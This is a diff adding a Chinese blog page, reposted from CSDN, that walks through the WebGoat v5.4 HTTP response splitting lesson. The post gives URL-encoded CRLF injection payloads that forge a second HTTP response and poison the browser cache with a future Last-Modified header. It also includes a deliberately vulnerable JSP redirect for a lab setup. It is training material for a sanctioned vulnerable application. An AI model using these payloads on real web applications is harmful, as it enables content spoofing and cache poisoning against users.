@@ -1,0 +1,467 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>OWASP | Gridea</title>
+<meta name="description" content="温故而知新">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<link rel="shortcut icon" href="https://jinqipiaopiao.github.io//favicon.ico?v=1638358535496">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="stylesheet" href="https://unpkg.com/papercss@1.6.1/dist/paper.min.css" />
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link rel="stylesheet" href="https://jinqipiaopiao.github.io//styles/main.css">
+
+
+<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+
+
+  </head>
+  <body>
+  
+    <nav class="navbar border fixed split-nav">
+  <div class="nav-brand">
+    <h3><a href="https://jinqipiaopiao.github.io/">Gridea</a></h3>
+  </div>
+  <div class="collapsible">
+    <input id="collapsible1" type="checkbox" name="collapsible1">
+    <button>
+      <label for="collapsible1">
+        <div class="bar1"></div>
+        <div class="bar2"></div>
+        <div class="bar3"></div>
+      </label>
+    </button>
+    <div class="collapsible-body">
+      <ul class="inline">
+        
+          <li>
+            
+              <a href="/" class="menu">
+                首页
+              </a>
+            
+          </li>
+        
+          <li>
+            
+              <a href="/archives" class="menu">
+                归档
+              </a>
+            
+          </li>
+        
+          <li>
+            
+              <a href="/tags" class="menu">
+                标签
+              </a>
+            
+          </li>
+        
+          <li>
+            
+              <a href="/post/about" class="menu">
+                关于
+              </a>
+            
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div id="top" class="row site">
+      <div class="sm-12 md-8 col">
+        <div class="paper">
+          <article class="article">
+            <h1>OWASP</h1>
+            <p class="article-meta">
+              2021-11-11
+              
+            </p>
+            
+            <div class="post-content">
+              <h1 id="webgoat-v54">WebGoat v5.4</h1>
+<p>1.General<br>
+<strong>Http Basics</strong><br>
+没啥讲的直接往里输个字符都能过<br>
+<strong>Http Splitting</strong></p>
+<p>＜－＞原理简介  http响应头截断是一种新的攻击技术，由该技术衍生了许多攻击的方法：web cache poisoning，cross user defacement，cross –site scripting等。攻击者利用它 可以获取用户的敏感信息甚至是包含用户名和密码的认证信息。在许多环境下都存在该攻击的可能，Microsoft ASP ,ASP NET, IBM WEBSPHERE,比较流行的的服务器，apache ，squid，还有浏览器IE6.0 SP1.</p>
+<pre><code>           造成http响应头截断漏洞的主要原因是对用户提交的非法字符没有进行严格的过滤，尤 其是CR,LF字符的输入。攻击者通过发送一经过精心构造的request，迫使服务器认为其返回的数据是两个响应，而不是常规的一个响应。当可以通过精心制作的request完全 控制第二个响应时，可以通过这样来实现攻击：发送两个请求A，B。A请求包含构造数据，该请求致使服务器返回两个响应R1，R2，其中R2是可以通过在A中的精心构造而 完全控制的。服务器将R1作为response返回给A，而第R2则被服务器作为B的response而返回给了B﹙即使R2并不是服务器自己生成的）。
+
+Request A-------------＞Web Server（R1，R2）
+Request B-------------＞Web Server (本该是R3)
+Web Server（R1）------------＞A
+Web Server（R2）——————＞B
+</code></pre>
+<p>HTTP Response Splitting翻译为HTTP应答拆分，是利用Web应用程序缺乏有效的输入验证，允许攻击者将CR 和LF 字符插入到应用程序响应的报头，从而将服务器的回应“拆分”成两个不同的HTTP 消息。攻击者通过发送一经过精心构造的HTTP请求，试图完全控制第二个响应来实现攻击。</p>
+<p>一些Web 应用程序使用用户输入的一部分产生响应中的报头的值，常见的例子是根据用户提交的值进行的重定向目标URL。例如某Web应用会根据用户选择不同的语言作为参数传递并用于响应报头中触发对相关网页的重定向，其代码如下：</p>
+<pre><code>&lt;% Response.sendRedirect(“/by_lang.jsp?lang=”+request.getParameter(“lang”)); %&gt;
+</code></pre>
+<p>正常情况下，当用户输入其选择的语言的时候，比如english，那么会跳转到/by_lang.jsp?lang=English页面，其响应如下：</p>
+<pre><code>HTTP/1.1 302 Moved Temporarily
+Date:Wed,24 Dec 2003 12:53:28 
+Location: http://victim.com/by_lang.jsp?lang=english
+Server: Apache Coyote/1.1
+Content-Type: text/html
+Set-Cookie: JSESSIONID=1PMRZOIQQzZIE6iivsREG82pq9B017h4YoHZ62RXjApqwBE 
+Connection:Close
+</code></pre>
+<p>从以上可以看到的是：输入的参数（english）已经提交到HTTP头中，这样我们就可以构造特殊的字符来拆分HTTP头，并到其后追加一个自己构造的头。比如我们提交如下的参数（已经过URLEncoding）：（最重要就是想要使它返回的是200）</p>
+<pre><code>foobar%0d%0aContent-Length:%200%0d%0a%0d%oaHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%Content-Length:%2019%0d%0a%0d%0a&lt;html&gt;Hacked&lt;/html&gt;
+解密后：
+foobar
+Content-Length: 0
+
+HTTP/1.1 200 OK
+Content-Type: text/html
+Content-Length: 19
+
+&lt;html&gt;Hacked&lt;/html&gt;
+</code></pre>
+<p>那么服务器返回的响应如下：</p>
+<pre><code>HTTP/1.1 302 Moved Temporarily
+Date:Wed,24 Dec 2003 15:26:41 GMT 
+Location: http://victim.com/by_lang.jsp?lang=foobar
+Content-Length:0
+
+HTTP/1.1 200 OK
+Content-Type: text/html
+Content-length: 19
+&lt;html&gt;Hacked&lt;/html&gt;
+Server: Apache Coyote/1.1
+Content-Type: text/html
+Set-Cookie: JSESSIONID=1PMRZOIQQzZIE6iivsREG82pq9B017h4YoHZ62RXjApqwBE 
+Connection:Close
+</code></pre>
+<p>其中第一个响应是302 重定向的响应，第二个响应是我们自己构造的响应。当客户端收到第一个响应之后会像相应头的Location指向的目标发起第二个请求，而这个时候客户端会认为第二个响应正是针对第二个请求的响应，从而达到了欺骗的目的。</p>
+<p>WebGoat里面有针对这个漏洞的教程。登录到WebGoat的界面后，访问General?HTTP Splitting页面即可进入HTTP应答拆分攻击的教程。这个分为两个阶段，第一阶段仅仅只是要求能够使用HTTP应答拆分的漏洞进行攻击，第二阶段则更进一步的要求能够使用HTTP响应头的Last-Modified字段污染使用者的缓存。</p>
+<p>为了判断页面是否可能存在HTTP应答拆分漏洞，我们先启动WebScarab，并且把浏览器的代理设置为WebScarab。然后进行正常输入后，从下图WebScarab上分析正常输入的请求与响应后可以发现在服务器的响应头中，重定向地址里面的Language这个参数恰好是我们通过浏览器提交的参数，这样就存在HTTP应答拆分漏洞的可能性。<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1636636865870.JPG" alt="" loading="lazy"></p>
+<p>我们可以进一步通过渗透性测试来判断是否真的存在这样的漏洞。首先来看看正常情况下服务器的响应信息如下：</p>
+<pre><code>HTTP/1.1 302 Moved Temporarily
+Server: Apache-Coyote/1.1
+Location: http://localhost/WebGoat/attack?Screen=3&amp;menu=100&amp;fromRedirect=yes&amp;language=test
+Content-Type: text/html;charset=ISO-8859-1
+Content-length: 0
+Date: Fri, 03 Aug 2012 06:52:48 GMT
+</code></pre>
+<p>我们把这个响应修改为我们希望的样子：</p>
+<pre><code>HTTP/1.1 302 Moved Temporarily
+Server: Apache-Coyote/1.1
+Location: http://localhost/WebGoat/attack?Screen=3&amp;menu=100&amp;fromRedirect=yes&amp;language=test
+Content-length: 0
+
+HTTP/1.1 200 OK
+Content-Type: text/html;
+Content-length: 19
+
+&lt;html&gt;hacked&lt;/html&gt;
+Content-Type: text/html;charset=ISO-8859-1
+Content-length: 0
+Date: Fri, 03 Aug 2012 06:52:48 GMT
+
+
+那么中间从test到&lt;/html&gt;的部分就是我们将要提交的内容，把这部分内容进行一下URLEncode之后转换成如下形式：
+
+test%0d%0aContent-length%3a+0%0d%0a%0d%0aHTTP%2f1.1+200+OK%0d%0aContent-Type%3a+text%2fhtml%3b%0d%0aContent-length%3a+19%0d%0a%0d%0a%26lt%3bhtml%26gt%3bhacked%26lt%3b%2fhtml%26gt%3b
+</code></pre>
+<p>这一段字符串就可以作为参数来进行提交了，我们把这段数据输入到WebGoat教程的的输入框里面并提交，就可以看到课程第一阶段成功完成：<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1636636924465.JPG" alt="" loading="lazy"></p>
+<p>刷新一下进入课程的第二阶段，课程的第二阶段要求我们能进一步污染受害者的缓存。为了做到这一点，我们需要在前面提交的参数中，自己伪造的HTTP响应头中添加一个Last-Modified字段，并且把它的值设为一个未来的值。这样当浏览器在下次请求同一个页面的时候发送If-Modified-Since字段并且这个值是一个未来的值，服务器在发现这个值大于该页面最后修改时间之后将返回HTTP的304响应码表示该页面没有更新过，从而达到了污染受害者缓存的目的。下面就是我们希望的能够污染受害者缓存的服务器响应，其中同样从test到<code>&lt;/html&gt;</code>部分就是我们需要提交的参数：</p>
+<pre><code>HTTP/1.1 302 Moved Temporarily
+Server: Apache-Coyote/1.1
+Location: http://localhost/WebGoat/attack?Screen=3&amp;menu=100&amp;fromRedirect=yes&amp;language=test
+Content-length: 0
+
+HTTP/1.1 200 OK
+Content-Type: text/html;
+Last-Modified: Thu, 01 Jan 2099 12:00:00 GMT 
+Content-length: 19
+
+&lt;html&gt;hacked&lt;/html&gt;
+Content-Type: text/html;charset=ISO-8859-1
+Content-length: 0
+Date: Fri, 03 Aug 2012 06:52:48 GMT
+</code></pre>
+<p>同样把需要提交的部分内容进行一下URLEncode之后转换成如下形式：（最重要的就是添加一个新的参数名Last-Modified:）</p>
+<pre><code>test%0d%0aContent-length%3a+0%0d%0a%0d%0aHTTP%2f1.1+200+OK%0d%0aContent-Type%3a+text%2fhtml%3b%0d%0aLast-Modified%3a+Thu%2c+01+Jan+2099+12%3a00%3a00+GMT+%0d%0aContent-length%3a+19%0d%0a%0d%0a%26lt%3bhtml%26gt%3bhacked%26lt%3b%2fhtml%26gt%3b
+</code></pre>
+<p>把这段数据输入到WebGoat并提交之后就可以看到课程成功完成：<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1636637042112.JPG" alt="" loading="lazy"><br>
+这边有个需要特别提出来解释一下的地方。可能有些细心的人已经发现了，当我们在WebGoat中提交上面所说的内容之后服务器真实的响应如下：</p>
+<pre><code>HTTP/1.1 302 Moved Temporarily
+Server: Apache-Coyote/1.1
+Location: http://localhost/WebGoat/attack?Screen=3&amp;menu=100&amp;fromRedirect=yes&amp;language=test%0d%0aContent-length%3a+0%0d%0a%0d%0aHTTP%2f1.1+200+OK%0d%0aContent-Type%3a+text%2fhtml%3b%0d%0aContent-length%3a+19%0d%0a%0d%0a%26lt%3bhtml%26gt%3bhacked%26lt%3b%2fhtml%26gt%3b%0d%0a
+Content-Type: text/html;charset=ISO-8859-1
+Content-length: 0
+Date: Fri, 03 Aug 2012 08:53:22 GMT
+</code></pre>
+<p>这并不是我们一开始所期望的样子，那么这是怎么回事儿呢？这是因为现在的主流Web服务器比如IIS，Apache HTTP Server以及WebGoat使用的Tomcat等等都有对这个问题作过改进，服务器会对即将发送出去的HTTP响应头里面每一项的值都会做一定的编码或者转换，以避免这个问题。比如Tomcat就响应头中的每一项的值都做过了URLEncode，从而保证即使Web应用存在HTTP应答拆分的漏洞，Web服务器上也从底层平台的角度保证了尽可能避免HTTP应答拆分漏洞带来的威胁。所以如果想要在自己的实验室环境中重现对HTTP应答拆分漏洞的成功利用，可以尝试安装比较老的Web服务器版本，比如Tomcat 4.1.24之前的版本。另外客户端也会有些关系，因为客户端可能会在每次请求后完全收取服务器响应回来的数据，并且把超出范围的多余数据丢弃，这样也可以避免HTTP应答拆分攻击可能造成的影响。我在自己的实验室环境中重现这个问题的时候采用了Apache 2.0.48并且通过mod_proxy来作为HTTP代理，Tomcat 4.1.23作为Web服务器，然后Web应用使用了下面这个有漏洞的JSP程序，就可以看到成功利用HTTP应答拆分漏洞之后的输出。</p>
+<pre><code>&lt;%@ page contentType=&quot;text/html; charset=UTF-8&quot;%&gt;
+&lt;% 
+String user_language = request.getParameter(&quot;user_language&quot;);
+System.out.println(user_language);
+response.sendRedirect(&quot;/&quot;+user_language+&quot;.jsp&quot;); 
+%&gt;
+</code></pre>
+<p>————————————————<br>
+版权声明：本文为CSDN博主「花花浪客」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>
+原文链接：https://blog.csdn.net/eatmilkboy/article/details/8061159</p>
+
+            </div>
+          </article>
+        </div>
+        <div class="paper" data-aos="fade-in">
+          
+            <div class="next-post">
+              <div class="next">
+                下一篇
+              </div>
+              <a href="https://jinqipiaopiao.github.io/post/php-yuan-cheng-rce-lou-dong-fu-xian-yi-ji-lun-xian-zhu-ji-ru-qin-su-yuan-fen-xi/">
+                <h3 class="post-title">
+                  PHP远程RCE漏洞复现以及沦陷主机入侵溯源分析
+                </h3>
+              </a>
+            </div>
+          
+        </div>
+        
+      </div>
+
+      <div class="sm-12 md-4 col sidebar">
+  <div class="paper info-container">
+    <img src="https://jinqipiaopiao.github.io//images/avatar.png?v=1638358535496" class="no-responsive avatar">
+    <div class="text-muted">温故而知新</div>
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+  </div>
+  <div class="paper">
+    <div class="sidebar-title">
+      最新文章
+    </div>
+    <div class="row">
+      <ul>
+        
+          
+            <li>
+              <a href="https://jinqipiaopiao.github.io/post/mian-shi/">面试</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://jinqipiaopiao.github.io/post/yong-heng-zhi-lan-li-yong/">永恒之蓝利用</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://jinqipiaopiao.github.io/post/owasp/">OWASP</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://jinqipiaopiao.github.io/post/php-yuan-cheng-rce-lou-dong-fu-xian-yi-ji-lun-xian-zhu-ji-ru-qin-su-yuan-fen-xi/">PHP远程RCE漏洞复现以及沦陷主机入侵溯源分析</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://jinqipiaopiao.github.io/post/wpscan/">wpscan</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://jinqipiaopiao.github.io/post/hui-bian-yu-yan/">汇编语言</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://jinqipiaopiao.github.io/post/qian-tan-wen-jian-shang-chuan-lou-dong/">浅谈文件上传漏洞</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://jinqipiaopiao.github.io/post/chang-jian-de-jie-xi-lou-dong-zong-jie/">常见的解析漏洞总结</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://jinqipiaopiao.github.io/post/2021-9-4-kai-xue-bi-ji/">2021-9-4开学笔记</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://jinqipiaopiao.github.io/post/shu-jia-xue-xi-bi-ji-ji-lu/">暑假学习笔记记录</a>
+            </li>
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+      </ul>
+    </div>
+  </div>
+  <div class="paper">
+    <div class="sidebar-title">
+      标签列表
+    </div>
+    <div class="row">
+      
+        <a href="https://jinqipiaopiao.github.io/tag/I-a6dyp2Q/" class="badge secondary">
+          Gridea
+        </a>
+      
+    </div>
+  </div>
+  <div class="paper">
+    Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a class="rss" href="https://jinqipiaopiao.github.io//atom.xml" target="_blank">RSS</a>
+  </div>
+</div>
+
+
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+
+<script type="application/javascript">
+
+AOS.init();
+
+hljs.initHighlightingOnLoad()
+
+</script>
+
+
+
+
+  </body>
+</html>
